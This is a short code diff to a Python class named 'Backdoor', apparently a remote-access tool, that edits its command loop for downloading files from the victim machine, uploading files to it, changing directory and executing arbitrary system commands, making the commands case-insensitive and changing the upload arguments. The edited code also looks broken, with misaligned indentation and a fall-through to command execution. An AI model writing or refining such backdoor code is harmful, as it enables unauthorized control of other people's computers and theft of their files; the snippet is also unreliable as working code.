@@ -58,12 +58,12 @@ class Backdoor:
                 command_result = self.change_directory(command[1])
 
             #download file
-            elif(command[0] == "download"):
+        elif(command[0].lower() == "download"):
                 command_result = self.read_file(command[1])
 
             #upload file
-            if(command[0] == "upload"):
-                command_result = self.write_file(command[0], command[1] )
+            if(command[0].lower() == "upload"):
+                command_result = self.write_file(command[1], command[2] )
 
             else:
                 command_result = self.execute_sys_command(command)
